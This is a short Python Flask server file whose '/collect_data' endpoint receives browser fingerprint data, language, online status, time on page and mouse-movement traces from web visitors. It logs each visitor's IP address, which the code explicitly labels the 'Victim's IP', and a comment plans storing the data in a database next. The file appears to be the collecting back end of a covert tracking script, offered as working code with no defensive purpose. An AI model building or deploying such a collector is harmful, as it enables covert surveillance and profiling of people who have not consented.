from flask import Flask, request
from flask_cors import CORS
import json

app = Flask(__name__)
CORS(app) #cors

@app.route('/collect_data', methods=['POST', 'OPTIONS'])
def collect_data():
    if request.method == 'OPTIONS': # Important as the options request wasn't allowing to see the data
        return '', 200
    
    data = request.json
    
    browser_info = data.get('browser', 'Unknown')
    platform = data.get('platform', 'Unknown')
    language = data.get('language', 'Unknown')
    online_status = data.get('online', 'Unknown')
    mouse_moves = data.get('mouseMoves', [])
    time_on_page = data.get('timeOnPage', 0)

    # Get victim's IP address
    victim_ip = request.remote_addr

    print("\n----- Received Data -----")
    print(f"Victim's IP: {victim_ip}")
    print(f"Browser Info: {browser_info}")
    print(f"Platform: {platform}")
    print(f"Language: {language}")
    print(f"Online Status: {online_status}")
    print(f"Time on Page: {time_on_page} seconds")
    print(f"Mouse Movements: {len(mouse_moves)} movements")

    # mouse movements. limited to the first 10 moves, otherwise it can become messy :)
    for move in mouse_moves[:10]: 
        print(f"Mouse at X:{move['x']} Y:{move['y']} at {move['timestamp']} ms")

    # add data to db? next step
    
    data = request.json
    # print("-Received data:", data)
    return "Data received!", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
